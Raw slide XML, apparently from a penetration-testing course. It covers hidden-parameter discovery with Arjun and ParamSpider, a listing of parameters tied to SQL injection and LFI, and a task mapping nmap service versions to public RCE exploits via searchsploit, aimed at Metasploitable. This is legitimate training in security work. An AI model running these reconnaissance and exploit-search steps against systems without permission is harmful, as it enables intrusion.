            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Example URL:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0"/>
              <a:t>site.com/product?id=13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>But hidden parameters might exist:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?id=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?file=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?page=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?redirect=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?debug=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>?admin=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>These parameters often lead to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>•	SQL Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>•	LFI</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>•	Open Redirect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>•	IDOR</a:t>
            </a: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46980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600"/>
            <a:ext cx="11244580" cy="57420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 smtClean="0"/>
              <a:t>Tool 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>— Arjun</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Finds hidden parameters by brute forcing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Install</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> clone https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>github.com/s0md3v/Arjun.git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10" y="1670539"/>
            <a:ext cx="8811512" cy="507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4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0"/>
            <a:ext cx="1210437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pipx upgrade Arjun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If that still doesn’t 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Patch the Bug </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2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Open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err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> ~/.local/share/pipx/venvs/arjun/lib/python3.13/site-packages/arjun/__main__.py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Find the line </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean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err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>request.status_code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B0F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Replace it with:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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err="1">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>request.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>status_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>", 0))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Now, save and exit.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️ Find directories / endpoints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As we have found by using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ffuf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etc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tools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40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170"/>
            <a:ext cx="12192000" cy="673983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2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Scan a URL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err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>arjun</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -u </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>hackthissite.org/search</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0070C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Example result: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Possible parameters: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id</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00206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page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file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redirect </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00206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9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Tool 2 — ParamSpider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Finds parameters from archived URLs.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Install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CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> clone https://github.com/devanshbatham/ParamSpider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CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cd ParamSpider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CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> pip3 install -r </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>requirements.txt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Scan Domain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err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>paramspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -d </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hackthissite.org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smtClean="0"/>
              <a:t> &gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hackthissite.org.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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751" y="118170"/>
            <a:ext cx="6156960" cy="360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0"/>
            <a:ext cx="119253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View the Results</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Open the file:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat results/hackthissite.org.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Preview first lines:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>head results/hackthissite.org.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Check how many parameter URLs were found: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E5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -l results/hackthissite.org.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Extract Unique Parameter Names</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can list all discovered parameter names with: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cat results/hackthissite.org.txt | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 's/.*?//' | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> '&amp;' '\n' | cut -d '=' -f1 | sort -u</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example output might look like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>id</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>search</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>user</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>category</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>redirect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lang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83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945" y="2044532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sz="9000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Task 02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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180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2407"/>
            <a:ext cx="8796770" cy="6415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5D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Task 02: CVE Mapping &amp; Exploit Research</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7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799"/>
            <a:ext cx="10860258" cy="5010443"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="26870F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Take the service versions discovered in Week 02 and</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="26870F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> find working exploits for them.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="26870F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="26870F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Technical Requirements: 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9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Searchsploit CLI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tool to find local exploit code for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>specific service </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>versions. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ Research vulnerabilities on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NVD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit-DB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ Focus on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Remote Code Execution (RCE)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Foothold</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> exploits. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Learning Goal: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Learn how to verify if a vulnerability is actually </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="9F2EA2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>exploitable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>in a real-world scenario. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="83200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2931885"/>
            <a:ext cx="8596668" cy="1320800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>TASK 2 Target:- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>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34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Grp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="90100"/>
            <a:ext cx="12001500" cy="691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40000"/>
              </a:lnSpc>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 1 — Collect Service Versions (From Week 02)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1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Before researching exploits, you must know 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what services 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and versions are running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These usually come from tools like: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Nmap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Service scanners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Banner grabbing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Example scan result:</a:t>
            </a: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nmap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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0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sV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192.168.1.10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</a:rPr>
              <a:t> </a:t>
            </a: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Example output:</a:t>
            </a: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PORT          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STATE     SERVICE          VERSION</a:t>
            </a:r>
            <a:b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22/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1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tcp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open          </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1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ssh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altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2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 err="1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OpenSSH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7.2p2</a:t>
            </a:r>
            <a:b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80/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1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tcp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open          http               Apache httpd 2.4.49</a:t>
            </a:r>
            <a:b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3306/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1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tcp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open</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="190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kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1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mysql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   MySQL 5.5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</a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" smtClean="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="9F2EA2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8D2B8F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Record these </a:t>
            </a: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8D2B8F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>service versions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8D2B8F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> because exploits are usually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rgbClr val="8D2B8F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> version-specific.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lang="en-US" altLang="en-US" sz="1900" dirty="0" smtClean="0">
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18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093" y="367099"/>
            <a:ext cx="6763807" cy="485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63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-31115" y="0"/>
            <a:ext cx="12223115" cy="774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Step 2 — Search for Exploits Using Searchsploit</a:t>
            </a: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401967"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" smtClean="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Searchsploit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401967"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> to check whether public exploit code exists.</a:t>
            </a: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401967"/>
                </a:solidFill>
                <a:effectLst/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>searchsploit &lt;service&gt; &lt;version&gt;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rgbClr val="401967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searchsploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B05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vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B05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2.3.4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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRP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Example output: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Apache HTTP Server 2.4.49 - Path Traversal / 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RCE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Apache HTTP Server 2.4.49 - Remote Code Execution  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 look for RCE from the obtained</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH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lang="en-US" altLang="en-US" sz="17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o</a:t>
            </a:r>
            <a:r>
